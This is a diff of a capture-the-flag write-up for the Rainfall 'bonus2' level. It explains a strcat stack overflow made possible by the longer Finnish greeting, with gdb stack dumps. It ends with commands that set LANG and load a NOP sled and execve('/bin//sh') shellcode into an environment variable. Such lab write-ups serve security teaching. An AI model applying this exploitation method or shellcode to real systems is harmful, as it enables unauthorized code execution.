@@ -1,14 +1,14 @@
-This program makes a call to strcat that is vulnerable to a buffer overflow.
+# This program makes a call to strcat that is vulnerable to a buffer overflow.
 
-The program expects argc to be equal to 3 :
+# The program expects argc to be equal to 3 :
 
 	0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
 	0x0804853c <+19>:	je     0x8048548 <main+31>
 	0x0804853e <+21>:	mov    $0x1,%eax
 	0x08048543 <+26>:	jmp    0x8048630 <main+263>
 
-Then two calls to strncpy copy the contents of argv[1] and argv[2] into a buffer
-located at 0x50(%esp) :
+# Then two calls to strncpy copy the contents of argv[1] and argv[2] into a buffer
+# located at 0x50(%esp) :
 
 	0x0804855c <+51>:	mov    0xc(%ebp),%eax
 	0x0804855f <+54>:	add    $0x4,%eax
@@ -33,21 +33,21 @@ located at 0x50(%esp) :
 
 		strncpy(buf + 0x28, argv[2], 0x20);
 	
-Whatever the size of that buffer is, it is not possible to copy more than 72
-bytes in it.
+# Whatever the size of that buffer is, it is not possible to copy more than 72
+# bytes in it.
 
-The program allows the user to retrieve the value of the environment variable
-LANG and sets a global variable according to its value.
-This value is then used to initialize a buffer in a subroutine with 3 potential
-strings : "Hello ", "Hyvää päivää " or "Goedemiddag! "
-(see source code for more details).
-For the exploit to work it is necessary to set the LANG environment variable to
-either fi or nl.
-Here I used LANG=fi. The special characters use two bytes for encoding instead
-of 1.
+# The program allows the user to retrieve the value of the environment variable
+# LANG and sets a global variable according to its value.
+# This value is then used to initialize a buffer in a subroutine with 3
+# potential strings : "Hello ", "Hyvää päivää " or "Goedemiddag! "
+# (see source code for more details).
+# For the exploit to work it is necessary to set the LANG environment variable
+# to either fi or nl.
+# Here I used LANG=fi. The special characters use two bytes for encoding instead
+# of 1.
 
-Fast forward to the interesting part, here is the state of the stack right
-before the call to strcat in the subroutine greetuser :
+# Fast forward to the interesting part, here is the state of the stack right
+# before the call to strcat in the subroutine greetuser :
 
 	(gdb) x/30wx $esp
 	0xbffff4e0:	0xbffff4f0	0xbffff540	0x00000001	0x00000000
@@ -62,16 +62,17 @@ before the call to strcat in the subroutine greetuser :
 	0xbffff540:	0x41414141	0x41414141	0x41414141	0x41414141
 	0xbffff550:	0x41414141	0x41414141
 
-We can see that the greeting message is null terminated at 0xbffff503.
+# We can see that the greeting message is null terminated at 0xbffff503.
 
-There is no bound check on the call to strcat, and since the buffer is too small
-to receive the longer greeting messages plus the 72 cumulative bytes of argv[1]
-and argv[2], here is the return address on the stack after the call to strcat :
+# There is no bound check on the call to strcat, and since the buffer is too
+# small to receive the longer greeting messages plus the 72 cumulative bytes of
+# argv[1] and argv[2], here is the return address on the stack after the call to
+# strcat :
 
 	(gdb) x/wx $ebp + 4
 	0xbffff53c:	0x42424242
 
-Putting everything together, we have :
+# Putting everything together, we have :
 
 bonus2@Rainfall:~$ export LANG=fi
 bonus2@Rainfall:~$ export SHELLCODE=`python -c "print '\x90' * 150 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
